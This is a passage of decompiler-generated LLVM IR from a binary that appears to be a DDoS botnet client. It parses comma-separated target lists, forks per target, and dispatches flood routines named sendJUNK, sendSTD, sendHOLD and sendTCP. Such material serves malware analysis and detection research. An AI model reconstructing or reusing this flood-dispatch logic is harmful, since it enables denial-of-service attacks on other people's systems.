  store i1 %v5_8050199, i1* %cf.global-to-local, align 1
  store i32 %v2_80501bf, i32* %stack_var_-476, align 4
  %v1_80501c5 = call i32 @atol(i32 %v2_80501bf)
  %v2_80501d6 = load i32, i32* %v1_8050197, align 4
  store i1 %v5_8050199, i1* %cf.global-to-local, align 1
  store i32 %v2_80501d6, i32* %stack_var_-476, align 4
  %v1_80501dc = call i32 @atol(i32 %v2_80501d6)
  %v5_80501ea = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_80501ea, i1* %cf.global-to-local, align 1
  store i32 %v2_80501b4, i32* %stack_var_-476, align 4
  %v2_80501f0 = inttoptr i32 %v2_80501b4 to i8*
  %v3_80501f0 = call i32 @__GI_strchr(i8* %v2_80501f0, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80501f8 = icmp eq i32 %v3_80501f0, 0
  br i1 %v1_80501f8, label %dec_label_pc_8050296, label %dec_label_pc_8050200

dec_label_pc_8050200:                             ; preds = %dec_label_pc_80501ae
  store i32 %v2_80501b4, i32* @eax, align 4
  store i1 %v5_80501ea, i1* %cf.global-to-local, align 1
  store i32 %v2_80501b4, i32* %stack_var_-476, align 4
  %v2_805020c = call i32 @__GI_strtok(i32 %v2_80501b4, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805028e291 = icmp eq i32 %v2_805020c, 0
  %v1_8050292292 = icmp eq i1 %v4_805028e291, false
  br i1 %v1_8050292292, label %dec_label_pc_8050219, label %dec_label_pc_80502e9

dec_label_pc_8050219:                             ; preds = %dec_label_pc_8050200, %dec_label_pc_8050279
  %storemerge43293 = phi i32 [ %v2_8050283, %dec_label_pc_8050279 ], [ %v2_805020c, %dec_label_pc_8050200 ]
  %v0_8050219 = call i32 @listFork()
  store i32 %v0_8050219, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805021e = icmp eq i32 %v0_8050219, 0
  %v1_8050220 = icmp eq i1 %v1_805021e, false
  %v0_8050279 = load i32, i32* @esp, align 4
  br i1 %v1_8050220, label %dec_label_pc_8050279, label %dec_label_pc_8050222

dec_label_pc_8050222:                             ; preds = %dec_label_pc_8050219
  %v5_8050222 = icmp ult i32 %v0_8050279, 4
  store i1 %v5_8050222, i1* %cf.global-to-local, align 1
  store i32 %storemerge43293, i32* %stack_var_-476, align 4
  %v3_805022e = call i32 @sendJUNK(i32 %storemerge43293, i32 %v1_80501c5, i32 %v1_80501dc)
  %v5_8050236 = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_8050236, i1* %cf.global-to-local, align 1
  store i32 %storemerge43293, i32* %stack_var_-476, align 4
  %v3_8050242 = trunc i32 %v1_80501c5 to i16
  %v4_8050242 = call i32 @sendSTD(i32 %storemerge43293, i16 %v3_8050242, i32 %v1_80501dc)
  store i1 %v5_8050236, i1* %cf.global-to-local, align 1
  store i32 %storemerge43293, i32* %stack_var_-476, align 4
  %v3_8050256 = call i32 @sendHOLD(i32 %storemerge43293, i32 %v1_80501c5, i32 %v1_80501dc)
  %v0_805025e = load i32, i32* @global_var_805f8c0.20, align 64
  store i1 %v5_8050199, i1* %cf.global-to-local, align 1
  store i32 %v0_805025e, i32* %stack_var_-476, align 4
  %v1_8050267 = call i32 @__libc_close(i32 %v0_805025e)
  store i1 %v5_8050199, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_8050274 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050279:                             ; preds = %dec_label_pc_8050219
  %v5_8050279 = icmp ult i32 %v0_8050279, 8
  store i1 %v5_8050279, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v2_8050283 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805028e = icmp eq i32 %v2_8050283, 0
  %v1_8050292 = icmp eq i1 %v4_805028e, false
  br i1 %v1_8050292, label %dec_label_pc_8050219, label %dec_label_pc_80502e9

dec_label_pc_8050296:                             ; preds = %dec_label_pc_80501ae
  %v0_8050296 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805029b = icmp eq i32 %v0_8050296, 0
  %v1_805029d = icmp eq i1 %v1_805029b, false
  br i1 %v1_805029d, label %dec_label_pc_8050835, label %dec_label_pc_80502a3

dec_label_pc_80502a3:                             ; preds = %dec_label_pc_8050296
  %v0_80502a3 = load i32, i32* @esp, align 4
  %v5_80502a3 = icmp ult i32 %v0_80502a3, 4
  store i1 %v5_80502a3, i1* %cf.global-to-local, align 1
  store i32 %v2_80501b4, i32* %stack_var_-476, align 4
  %v3_80502af = call i32 @sendJUNK(i32 %v2_80501b4, i32 %v1_80501c5, i32 %v1_80501dc)
  %v5_80502b7 = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_80502b7, i1* %cf.global-to-local, align 1
  store i32 %v2_80501b4, i32* %stack_var_-476, align 4
  %v3_80502c3 = trunc i32 %v1_80501c5 to i16
  %v4_80502c3 = call i32 @sendSTD(i32 %v2_80501b4, i16 %v3_80502c3, i32 %v1_80501dc)
  store i1 %v5_80502b7, i1* %cf.global-to-local, align 1
  store i32 %v2_80501b4, i32* %stack_var_-476, align 4
  %v3_80502d7 = call i32 @sendHOLD(i32 %v2_80501b4, i32 %v1_80501c5, i32 %v1_80501dc)
  store i1 %v5_8050199, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_80502e4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80502e9:                             ; preds = %dec_label_pc_8050200, %dec_label_pc_8050279, %dec_label_pc_8050120
  %v2_80502ec = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_8050309 = inttoptr i32 %v2_80502ec to i8*
  store i32 %v2_80502ec, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c8bf.887 to i32), i32* @edi, align 4
  %v7_805031b = call i32 @_strncmp(i8* %v4_8050309, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c8bf.887, i32 0, i32 0), i32 4)
  %v8_805031b = urem i32 %v7_805031b, 2
  %v9_805031b = icmp eq i32 %v8_805031b, 0
  %v0_805031d = load i1, i1* %cf.global-to-local, align 1
  %v2_805031d = or i1 %v0_805031d, %v9_805031b
  %v3_805031d = zext i1 %v2_805031d to i32
  %v4_805031d = load i32, i32* @edx, align 4
  %v5_805031d = and i32 %v4_805031d, -256
  %v6_805031d = or i32 %v3_805031d, %v5_805031d
  %v7_805031d = xor i32 %v6_805031d, 1
  store i32 %v7_805031d, i32* @edx, align 4
  %v1_8050325 = trunc i32 %v7_805031d to i8
  %v3_8050325 = zext i1 %v0_805031d to i8
  %v4_8050325 = sub nsw i8 %v1_8050325, %v3_8050325
  %v15_8050325 = icmp eq i8 %v4_8050325, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805032e = icmp eq i1 %v15_8050325, false
  br i1 %v1_805032e, label %dec_label_pc_805044d, label %dec_label_pc_8050334

dec_label_pc_8050334:                             ; preds = %dec_label_pc_80502e9
  %v2_8050329 = sext i8 %v4_8050325 to i32
  %v9_8050334 = icmp ult i32 %tmp207, 3
  store i1 %v9_8050334, i1* %cf.global-to-local, align 1
  %v7_8050338 = icmp sgt i32 %tmp207, 3
  br i1 %v7_8050338, label %dec_label_pc_805033e, label %dec_label_pc_8050835

dec_label_pc_805033e:                             ; preds = %dec_label_pc_8050334
  %v1_8050341 = add i32 %tmp223, 8
  %v1_8050344 = inttoptr i32 %v1_8050341 to i32*
  %v2_8050344 = load i32, i32* %v1_8050344, align 4
  %v0_8050346 = load i32, i32* @esp, align 4
  %v5_8050346 = icmp ult i32 %v0_8050346, 12
  store i1 %v5_8050346, i1* %cf.global-to-local, align 1
  store i32 %v2_8050344, i32* %stack_var_-492, align 4
  %v1_805034a = call i32 @atol(i32 %v2_8050344)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp267 = icmp slt i32 %v1_805034a, 1
  br i1 %tmp267, label %dec_label_pc_8050835, label %dec_label_pc_805035a

dec_label_pc_805035a:                             ; preds = %dec_label_pc_805033e
  %v1_805035d = add i32 %tmp223, 12
  %v1_8050360 = inttoptr i32 %v1_805035d to i32*
  %v2_8050360 = load i32, i32* %v1_8050360, align 4
  %v5_8050362 = icmp ult i32* %stack_var_-476, inttoptr (i32 12 to i32*)
  store i1 %v5_8050362, i1* %cf.global-to-local, align 1
  store i32 %v2_8050360, i32* %stack_var_-492, align 4
  %v1_8050366 = call i32 @atol(i32 %v2_8050360)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp268 = icmp slt i32 %v1_8050366, 1
  %tmp269 = icmp eq i1 %tmp268, false
  br i1 %tmp269, label %dec_label_pc_8050377, label %dec_label_pc_8050835

dec_label_pc_8050377:                             ; preds = %dec_label_pc_805035a
  %v1_805037a = add i32 %tmp223, 4
  %v1_805037d = inttoptr i32 %v1_805037a to i32*
  %v2_805037d = load i32, i32* %v1_805037d, align 4
  %v2_8050388 = load i32, i32* %v1_8050344, align 4
  store i1 %v5_8050362, i1* %cf.global-to-local, align 1
  store i32 %v2_8050388, i32* %stack_var_-492, align 4
  %v1_805038e = call i32 @atol(i32 %v2_8050388)
  %v2_805039f = load i32, i32* %v1_8050360, align 4
  store i1 %v5_8050362, i1* %cf.global-to-local, align 1
  store i32 %v2_805039f, i32* %stack_var_-492, align 4
  %v1_80503a5 = call i32 @atol(i32 %v2_805039f)
  %v5_80503b3 = icmp ult i32* %stack_var_-476, inttoptr (i32 8 to i32*)
  store i1 %v5_80503b3, i1* %cf.global-to-local, align 1
  store i32 %v2_805037d, i32* %stack_var_-492, align 4
  %v2_80503b9 = inttoptr i32 %v2_805037d to i8*
  %v3_80503b9 = call i32 @__GI_strchr(i8* %v2_80503b9, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503c1 = icmp eq i32 %v3_80503b9, 0
  br i1 %v1_80503c1, label %dec_label_pc_8050422, label %dec_label_pc_80503c5

dec_label_pc_80503c5:                             ; preds = %dec_label_pc_8050377
  store i32 %v2_805037d, i32* @eax, align 4
  store i1 %v5_80503b3, i1* %cf.global-to-local, align 1
  store i32 %v2_805037d, i32* %stack_var_-492, align 4
  %v2_80503d1 = call i32 @__GI_strtok(i32 %v2_805037d, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805041a288 = icmp eq i32 %v2_80503d1, 0
  %v1_805041e289 = icmp eq i1 %v4_805041a288, false
  br i1 %v1_805041e289, label %dec_label_pc_80503de, label %dec_label_pc_805044d

dec_label_pc_80503de:                             ; preds = %dec_label_pc_80503c5, %dec_label_pc_8050405
  %storemerge119290 = phi i32 [ %v2_805040f, %dec_label_pc_8050405 ], [ %v2_80503d1, %dec_label_pc_80503c5 ]
  %v0_80503de = call i32 @listFork()
  store i32 %v0_80503de, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503e3 = icmp eq i32 %v0_80503de, 0
  %v1_80503e5 = icmp eq i1 %v1_80503e3, false
  %v0_8050405 = load i32, i32* @esp, align 4
  br i1 %v1_80503e5, label %dec_label_pc_8050405, label %dec_label_pc_80503e7

dec_label_pc_80503e7:                             ; preds = %dec_label_pc_80503de
  %v5_80503e7 = icmp ult i32 %v0_8050405, 4
  store i1 %v5_80503e7, i1* %cf.global-to-local, align 1
  store i32 %storemerge119290, i32* %stack_var_-492, align 4
  %v3_80503f3 = trunc i32 %v1_805038e to i16
  %v4_80503f3 = call i32 @sendSTD(i32 %storemerge119290, i16 %v3_80503f3, i32 %v1_80503a5)
  store i1 %v5_8050362, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_8050400 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050405:                             ; preds = %dec_label_pc_80503de
  %v5_8050405 = icmp ult i32 %v0_8050405, 8
  store i1 %v5_8050405, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v2_805040f = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805041a = icmp eq i32 %v2_805040f, 0
  %v1_805041e = icmp eq i1 %v4_805041a, false
  br i1 %v1_805041e, label %dec_label_pc_80503de, label %dec_label_pc_805044d

dec_label_pc_8050422:                             ; preds = %dec_label_pc_8050377
  %v0_8050422 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050427 = icmp eq i32 %v0_8050422, 0
  %v1_8050429 = icmp eq i1 %v1_8050427, false
  br i1 %v1_8050429, label %dec_label_pc_8050835, label %dec_label_pc_805042f

dec_label_pc_805042f:                             ; preds = %dec_label_pc_8050422
  %v0_805042f = load i32, i32* @esp, align 4
  %v5_805042f = icmp ult i32 %v0_805042f, 4
  store i1 %v5_805042f, i1* %cf.global-to-local, align 1
  store i32 %v2_805037d, i32* %stack_var_-492, align 4
  %v3_805043b = trunc i32 %v1_805038e to i16
  %v4_805043b = call i32 @sendSTD(i32 %v2_805037d, i16 %v3_805043b, i32 %v1_80503a5)
  store i1 %v5_8050362, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_8050448 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_805044d:                             ; preds = %dec_label_pc_80503c5, %dec_label_pc_8050405, %dec_label_pc_80502e9
  %v2_8050450 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_805046d = inttoptr i32 %v2_8050450 to i8*
  %v7_805047f = call i32 @_strncmp(i8* %v4_805046d, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c8c3.888, i32 0, i32 0), i32 4)
  %v8_805047f = urem i32 %v7_805047f, 2
  %v9_805047f = icmp eq i32 %v8_805047f, 0
  %v0_8050481 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050481 = or i1 %v0_8050481, %v9_805047f
  %v3_8050481 = zext i1 %v2_8050481 to i32
  %v4_8050481 = load i32, i32* @edx, align 4
  %v5_8050481 = and i32 %v4_8050481, -256
  %v6_8050481 = or i32 %v3_8050481, %v5_8050481
  %v7_8050481 = xor i32 %v6_8050481, 1
  store i32 %v7_8050481, i32* @edx, align 4
  %v1_8050489 = trunc i32 %v7_8050481 to i8
  %v3_8050489 = zext i1 %v0_8050481 to i8
  %v4_8050489 = sub nsw i8 %v1_8050489, %v3_8050489
  %v15_8050489 = icmp eq i8 %v4_8050489, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050492 = icmp eq i1 %v15_8050489, false
  br i1 %v1_8050492, label %dec_label_pc_80506d5, label %dec_label_pc_8050498

dec_label_pc_8050498:                             ; preds = %dec_label_pc_805044d
  %v2_805048d = sext i8 %v4_8050489 to i32
  %v9_8050498 = icmp ult i32 %tmp207, 5
  store i1 %v9_8050498, i1* %cf.global-to-local, align 1
  %v7_805049c = icmp sgt i32 %tmp207, 5
  br i1 %v7_805049c, label %dec_label_pc_80504a2, label %dec_label_pc_8050835

dec_label_pc_80504a2:                             ; preds = %dec_label_pc_8050498
  %v1_80504a5 = add i32 %tmp223, 12
  %v1_80504a8 = inttoptr i32 %v1_80504a5 to i32*
  %v2_80504a8 = load i32, i32* %v1_80504a8, align 4
  %v0_80504aa = load i32, i32* @esp, align 4
  %v5_80504aa = icmp ult i32 %v0_80504aa, 12
  store i1 %v5_80504aa, i1* %cf.global-to-local, align 1
  store i32 %v2_80504a8, i32* %stack_var_-492, align 4
  %v1_80504ae = call i32 @atol(i32 %v2_80504a8)
  %v5_80504b6 = icmp ne i32 %v1_80504ae, -1
  store i1 %v5_80504b6, i1* %cf.global-to-local, align 1
  %v10_80504b6 = icmp eq i32 %v1_80504ae, -1
  br i1 %v10_80504b6, label %dec_label_pc_8050835, label %dec_label_pc_80504bf

dec_label_pc_80504bf:                             ; preds = %dec_label_pc_80504a2
  %v1_80504c2 = add i32 %tmp223, 8
  %v1_80504c5 = inttoptr i32 %v1_80504c2 to i32*
  %v2_80504c5 = load i32, i32* %v1_80504c5, align 4
  %v5_80504c7 = icmp ult i32* %stack_var_-476, inttoptr (i32 12 to i32*)
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_80504c5, i32* %stack_var_-492, align 4
  %v1_80504cb = call i32 @atol(i32 %v2_80504c5)
  %v5_80504d3 = icmp ne i32 %v1_80504cb, -1
  store i1 %v5_80504d3, i1* %cf.global-to-local, align 1
  %v10_80504d3 = icmp eq i32 %v1_80504cb, -1
  br i1 %v10_80504d3, label %dec_label_pc_8050835, label %dec_label_pc_80504dc

dec_label_pc_80504dc:                             ; preds = %dec_label_pc_80504bf
  %v1_80504df = add i32 %tmp223, 16
  %v1_80504e2 = inttoptr i32 %v1_80504df to i32*
  %v2_80504e2 = load i32, i32* %v1_80504e2, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_80504e2, i32* %stack_var_-492, align 4
  %v1_80504e8 = call i32 @atol(i32 %v2_80504e2)
  %v5_80504f0 = icmp ne i32 %v1_80504e8, -1
  store i1 %v5_80504f0, i1* %cf.global-to-local, align 1
  %v10_80504f0 = icmp eq i32 %v1_80504e8, -1
  br i1 %v10_80504f0, label %dec_label_pc_8050835, label %dec_label_pc_80504f9

dec_label_pc_80504f9:                             ; preds = %dec_label_pc_80504dc
  %v2_80504ff = load i32, i32* %v1_80504e2, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_80504ff, i32* %stack_var_-492, align 4
  %v1_8050505 = call i32 @atol(i32 %v2_80504ff)
  %v1_805050d = add i32 %v1_8050505, -32
  %v2_805050d = icmp ult i32 %v1_8050505, 32
  %v3_805050d = sub i32 31, %v1_8050505
  %v4_805050d = and i32 %v3_805050d, %v1_8050505
  %v5_805050d = icmp slt i32 %v4_805050d, 0
  store i1 %v2_805050d, i1* %cf.global-to-local, align 1
  %v6_805050d = icmp eq i32 %v1_805050d, 0
  %v7_805050d = icmp slt i32 %v1_805050d, 0
  %v3_8050510 = icmp eq i1 %v7_805050d, %v5_805050d
  %v4_8050510 = icmp eq i1 %v6_805050d, false
  %v5_8050510 = and i1 %v4_8050510, %v3_8050510
  br i1 %v5_8050510, label %dec_label_pc_8050835, label %dec_label_pc_8050516

dec_label_pc_8050516:                             ; preds = %dec_label_pc_80504f9
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_805051a = icmp sgt i32 %tmp207, 6
  br i1 %v7_805051a, label %dec_label_pc_805051c, label %dec_label_pc_8050538.thread

dec_label_pc_8050538.thread:                      ; preds = %dec_label_pc_8050516
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805055b

dec_label_pc_805051c:                             ; preds = %dec_label_pc_8050516
  %v1_805051f = add i32 %tmp223, 24
  %v1_8050522 = inttoptr i32 %v1_805051f to i32*
  %v2_8050522 = load i32, i32* %v1_8050522, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_8050522, i32* %stack_var_-492, align 4
  %v1_8050528 = call i32 @atol(i32 %v2_8050522)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_8050530 = icmp slt i32 %v1_8050528, 0
  br i1 %v2_8050530, label %dec_label_pc_8050835, label %dec_label_pc_8050538

dec_label_pc_8050538:                             ; preds = %dec_label_pc_805051c
  %v8_8050538 = icmp ult i32 %tmp207, 8
  store i1 %v8_8050538, i1* %cf.global-to-local, align 1
  %v12_8050538 = icmp eq i32 %tmp207, 8
  %v1_805053c = icmp eq i1 %v12_8050538, false
  br i1 %v1_805053c, label %dec_label_pc_805055b, label %dec_label_pc_805053e

dec_label_pc_805053e:                             ; preds = %dec_label_pc_8050538
  %v1_8050541 = add i32 %tmp223, 28
  %v1_8050544 = inttoptr i32 %v1_8050541 to i32*
  %v2_8050544 = load i32, i32* %v1_8050544, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_8050544, i32* %stack_var_-492, align 4
  %v1_805054a = call i32 @atol(i32 %v2_8050544)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp270 = icmp slt i32 %v1_805054a, 1
  %tmp271 = icmp eq i1 %tmp270, false
  br i1 %tmp271, label %dec_label_pc_805055b, label %dec_label_pc_8050835

dec_label_pc_805055b:                             ; preds = %dec_label_pc_8050538.thread, %dec_label_pc_805053e, %dec_label_pc_8050538
  %v8_8050538275 = phi i1 [ true, %dec_label_pc_8050538.thread ], [ %v8_8050538, %dec_label_pc_805053e ], [ %v8_8050538, %dec_label_pc_8050538 ]
  %v1_805053c277 = phi i1 [ true, %dec_label_pc_8050538.thread ], [ false, %dec_label_pc_805053e ], [ true, %dec_label_pc_8050538 ]
  %v1_805055e = add i32 %tmp223, 4
  %v1_8050561 = inttoptr i32 %v1_805055e to i32*
  %v2_8050561 = load i32, i32* %v1_8050561, align 4
  %v2_805056c = load i32, i32* %v1_80504c5, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_805056c, i32* %stack_var_-492, align 4
  %v1_8050572 = call i32 @atol(i32 %v2_805056c)
  %v2_8050583 = load i32, i32* %v1_80504a8, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_8050583, i32* %stack_var_-492, align 4
  %v1_8050589 = call i32 @atol(i32 %v2_8050583)
  %v2_805059a = load i32, i32* %v1_80504e2, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_805059a, i32* %stack_var_-492, align 4
  %v1_80505a0 = call i32 @atol(i32 %v2_805059a)
  %v1_80505ae = add i32 %tmp223, 20
  %v1_80505b1 = inttoptr i32 %v1_80505ae to i32*
  %v2_80505b1 = load i32, i32* %v1_80505b1, align 4
  store i1 %v8_8050538275, i1* %cf.global-to-local, align 1
  br i1 %v1_805053c277, label %dec_label_pc_80505e2, label %dec_label_pc_80505bc

dec_label_pc_80505bc:                             ; preds = %dec_label_pc_805055b
  %v1_80505bf = add i32 %tmp223, 28
  %v1_80505c2 = inttoptr i32 %v1_80505bf to i32*
  %v2_80505c2 = load i32, i32* %v1_80505c2, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_80505c2, i32* %stack_var_-492, align 4
  %v1_80505c8 = call i32 @atol(i32 %v2_80505c2)
  %v0_80505cd = load i32, i32* @esp, align 4
  %v2_80505cd = icmp ugt i32 %v0_80505cd, -17
  store i1 %v2_80505cd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80505e2

dec_label_pc_80505e2:                             ; preds = %dec_label_pc_805055b, %dec_label_pc_80505bc
  %storemerge41 = phi i32 [ %v1_80505c8, %dec_label_pc_80505bc ], [ 10, %dec_label_pc_805055b ]
  store i32 %storemerge41, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_805051a, label %dec_label_pc_80505f1, label %dec_label_pc_8050617

dec_label_pc_80505f1:                             ; preds = %dec_label_pc_80505e2
  %v1_80505f4 = add i32 %tmp223, 24
  %v1_80505f7 = inttoptr i32 %v1_80505f4 to i32*
  %v2_80505f7 = load i32, i32* %v1_80505f7, align 4
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 %v2_80505f7, i32* %stack_var_-492, align 4
  %v1_80505fd = call i32 @atol(i32 %v2_80505f7)
  %v0_8050602 = load i32, i32* @esp, align 4
  %v2_8050602 = icmp ugt i32 %v0_8050602, -17
  store i1 %v2_8050602, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050617

dec_label_pc_8050617:                             ; preds = %dec_label_pc_80505e2, %dec_label_pc_80505f1
  %storemerge40 = phi i32 [ %v1_80505fd, %dec_label_pc_80505f1 ], [ 0, %dec_label_pc_80505e2 ]
  store i32 %storemerge40, i32* @edi, align 4
  %v5_8050623 = icmp ult i32* %stack_var_-476, inttoptr (i32 8 to i32*)
  store i1 %v5_8050623, i1* %cf.global-to-local, align 1
  store i32 %v2_8050561, i32* %stack_var_-492, align 4
  %v2_8050629 = inttoptr i32 %v2_8050561 to i8*
  %v3_8050629 = call i32 @__GI_strchr(i8* %v2_8050629, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050631 = icmp eq i32 %v3_8050629, 0
  br i1 %v1_8050631, label %dec_label_pc_805069e, label %dec_label_pc_8050635

dec_label_pc_8050635:                             ; preds = %dec_label_pc_8050617
  store i32 %v2_8050561, i32* @eax, align 4
  store i1 %v5_8050623, i1* %cf.global-to-local, align 1
  store i32 %v2_8050561, i32* %stack_var_-492, align 4
  %v2_8050641 = call i32 @__GI_strtok(i32 %v2_8050561, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050696285 = icmp eq i32 %v2_8050641, 0
  %v1_805069a286 = icmp eq i1 %v4_8050696285, false
  br i1 %v1_805069a286, label %dec_label_pc_805064e, label %dec_label_pc_80506d5

dec_label_pc_805064e:                             ; preds = %dec_label_pc_8050635, %dec_label_pc_8050681
  %storemerge39287 = phi i32 [ %v2_805068b, %dec_label_pc_8050681 ], [ %v2_8050641, %dec_label_pc_8050635 ]
  %v0_805064e = call i32 @listFork()
  store i32 %v0_805064e, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050653 = icmp eq i32 %v0_805064e, 0
  %v1_8050655 = icmp eq i1 %v1_8050653, false
  %v0_8050681 = load i32, i32* @esp, align 4
  br i1 %v1_8050655, label %dec_label_pc_8050681, label %dec_label_pc_8050657

dec_label_pc_8050657:                             ; preds = %dec_label_pc_805064e
  %v5_8050657 = icmp ult i32 %v0_8050681, 4
  store i1 %v5_8050657, i1* %cf.global-to-local, align 1
  store i32 %v2_80505b1, i32* %stack_var_-492, align 4
  store i32 %storemerge39287, i32* %stack_var_-508, align 4
  %v7_805066f = inttoptr i32 %v2_80505b1 to i8*
  %v8_805066f = call i32 @sendTCP(i32 %storemerge39287, i32 %v1_8050572, i32 %v1_8050589, i32 %v1_80505a0, i8* %v7_805066f, i32 %storemerge40, i32 %storemerge41)
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_805067c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050681:                             ; preds = %dec_label_pc_805064e
  %v5_8050681 = icmp ult i32 %v0_8050681, 8
  store i1 %v5_8050681, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v2_805068b = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050696 = icmp eq i32 %v2_805068b, 0
  %v1_805069a = icmp eq i1 %v4_8050696, false
  br i1 %v1_805069a, label %dec_label_pc_805064e, label %dec_label_pc_80506d5

dec_label_pc_805069e:                             ; preds = %dec_label_pc_8050617
  %v0_805069e = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80506a3 = icmp eq i32 %v0_805069e, 0
  %v1_80506a5 = icmp eq i1 %v1_80506a3, false
  br i1 %v1_80506a5, label %dec_label_pc_8050835, label %dec_label_pc_80506ab

dec_label_pc_80506ab:                             ; preds = %dec_label_pc_805069e
  %v0_80506ab = load i32, i32* @esp, align 4
  %v5_80506ab = icmp ult i32 %v0_80506ab, 4
  store i1 %v5_80506ab, i1* %cf.global-to-local, align 1
  store i32 %v2_80505b1, i32* %stack_var_-492, align 4
  store i32 %v2_8050561, i32* %stack_var_-508, align 4
  %v7_80506c3 = inttoptr i32 %v2_80505b1 to i8*
  %v8_80506c3 = call i32 @sendTCP(i32 %v2_8050561, i32 %v1_8050572, i32 %v1_8050589, i32 %v1_80505a0, i8* %v7_80506c3, i32 %storemerge40, i32 %storemerge41)
  store i1 %v5_80504c7, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_80506d0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80506d5:                             ; preds = %dec_label_pc_8050635, %dec_label_pc_8050681, %dec_label_pc_805044d
  %v2_80506d8 = load i32, i32* %v1_804f416, align 4
  %v4_80506f5 = inttoptr i32 %v2_80506d8 to i8*
  %v7_8050707 = call i32 @_strncmp(i8* %v4_80506f5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805c8c7.889, i32 0, i32 0), i32 5)
  %v8_8050707 = urem i32 %v7_8050707, 2
  %v9_8050707 = icmp eq i32 %v8_8050707, 0
  %v0_8050709 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050709 = or i1 %v0_8050709, %v9_8050707
  %v3_8050709 = zext i1 %v2_8050709 to i32
  %v4_8050709 = load i32, i32* @edx, align 4
  %v5_8050709 = and i32 %v4_8050709, -256
  %v6_8050709 = or i32 %v3_8050709, %v5_8050709
  %v7_8050709 = xor i32 %v6_8050709, 1
  store i32 %v7_8050709, i32* %edx.global-to-local, align 4
  %v1_8050711 = trunc i32 %v7_8050709 to i8
  %v3_8050711 = zext i1 %v0_8050709 to i8
  %v15_8050711 = icmp eq i8 %v1_8050711, %v3_8050711
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805071a = icmp eq i1 %v15_8050711, false
  br i1 %v1_805071a, label %dec_label_pc_80507e4, label %dec_label_pc_8050787.preheader

